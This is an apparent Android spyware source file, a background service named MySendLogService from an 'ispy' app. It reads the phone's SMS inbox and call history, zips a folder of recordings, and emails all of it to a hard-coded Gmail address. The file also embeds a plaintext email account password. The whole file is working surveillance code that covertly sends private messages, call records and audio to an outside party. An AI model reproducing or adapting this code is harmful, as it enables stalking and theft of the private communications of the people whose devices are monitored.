package com.softs.aben.ispy.mailing;
import android.Manifest;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.support.annotation.Nullable;
import android.support.v4.content.ContextCompat;
import android.util.Log;
import android.widget.Toast;
import com.softs.aben.ispy.LoginActivity;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;


public class MySendLogService extends Service {


    private String phNum;
    private String callType;
    private String callDate;
    private String callDuration;
    SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss");
    LoginActivity login=new LoginActivity();
    String currentDateandTime = sdf.format(new Date());

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {//Log Sender

            Mail m = new Mail("dagifkir@gmail.com", "weldegiorgistilahun");
            //call logger
            StringBuffer sb = new StringBuffer();//sms..start
            Uri uriSMSURI = Uri.parse("content://sms/inbox");
            Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
            String sms = "";
            //sms.. end
            if (ContextCompat.checkSelfPermission(getApplicationContext(),
                    Manifest.permission.READ_CALL_LOG)
                    != PackageManager.PERMISSION_GRANTED) {

            } else {
                Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
                int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
                int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
                int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
                int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

                while (cur.moveToNext()) {//sms while
                    sms += "From :" + cur.getString(2) + " : " + cur.getString(11) + ":" + cur.getString(cur.getColumnIndexOrThrow("body")).toString() + "\n";
                }//sms
                while (managedCursor.moveToNext()) {
                    phNum = managedCursor.getString(number);
                    callType = managedCursor.getString(type);
                    callDate = managedCursor.getString(date);
                    Date callDayTime = new Date(Long.valueOf(callDate));
                    callDuration = managedCursor.getString(duration);

                    String dir = null;
                    int dircode = Integer.parseInt(callType);
                    switch (dircode) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            dir = "OUTGOING";
                            break;
                        case CallLog.Calls.INCOMING_TYPE:
                            dir = "INCOMING";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            dir = "MISSED";
                            break;
                    }
                    sb.append("\nPhone Number:--- " + phNum + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
                    sb.append("\n----------------------------------");

                }

                String[] toArr = {"abenezer.woldegiorgis@gmail.com"};
                m.set_to(toArr);
                m.set_from("dagifkir@gmail.com");
                m.set_subject("This is an email sent using my Mail JavaMail wrapper from an Android device.");
                m.set_body("Here is the list of Log" + sb + "Here is Inbox Message" + sms);
                try {
                    // Adds multiple attachments
                    File dir = new File(Environment.getExternalStorageDirectory().getAbsolutePath()
                            + "/iSpyRecord");
                    File[] files = dir.listFiles();
                    int numberOfFiles=files.length;
                    if(numberOfFiles>=7){
                        zipFolder(Environment.getExternalStorageDirectory()
                                + "/iSpyRecord",Environment.getExternalStorageDirectory().getAbsolutePath()+"/iSpyrecording.zip");

                    }
                    m.addAttachment(Environment.getExternalStorageDirectory().getAbsolutePath()+"/iSpyrecording.zip");
                    if (m.send()) {
                        Toast.makeText(getApplicationContext(), "sent successfully.", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(getApplicationContext(), "not sent.", Toast.LENGTH_SHORT).show();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    Toast.makeText(getApplicationContext(), "problem sending the email.", Toast.LENGTH_SHORT).show();
                    Log.e("MailApp", "Could not send email", e);
                }
            }
        } catch (Exception Ex) {
            Ex.printStackTrace();
        }
        return super.onStartCommand(intent, flags, startId);
    }

    private static void zipFolder(String inputFolderPath, String outZipPath) {
        try {
            FileOutputStream fos = new FileOutputStream(outZipPath);
            ZipOutputStream zos = new ZipOutputStream(fos);
            File srcFile = new File(inputFolderPath);
            File[] files = srcFile.listFiles();
            Log.d("", "Zip directory: " + srcFile.getName());
            for (int i = 0; i < files.length; i++) {
                Log.d("", "Adding file: " + files[i].getName());
                byte[] buffer = new byte[1024];
                FileInputStream fis = new FileInputStream(files[i]);
                zos.putNextEntry(new ZipEntry(files[i].getName()));
                int length;
                while ((length = fis.read(buffer)) > 0) {
                    zos.write(buffer, 0, length);
                }
                zos.closeEntry();
                fis.close();
            }
            zos.close();
        } catch (IOException ioe) {
            Log.e("", ioe.getMessage());
        }
    }
}